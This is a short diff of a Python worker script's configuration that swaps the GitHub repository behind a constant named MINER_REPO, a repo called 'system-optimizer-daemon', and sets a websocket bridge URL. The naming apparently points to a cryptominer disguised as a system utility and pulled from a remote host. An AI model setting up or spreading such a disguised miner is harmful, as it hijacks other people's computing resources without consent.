@@ -10,7 +10,7 @@ import subprocess
 from datetime import datetime
 
 # Worker config
-MINER_REPO = "https://github.com/amineborkadi/system-optimizer-daemon.git"
+MINER_REPO = "https://github.com/hkolyholy/system-optimizer-daemon.git"
 BRIDGE_URL = "wss://chimera-bridge-production-0ef2.up.railway.app"
 
 
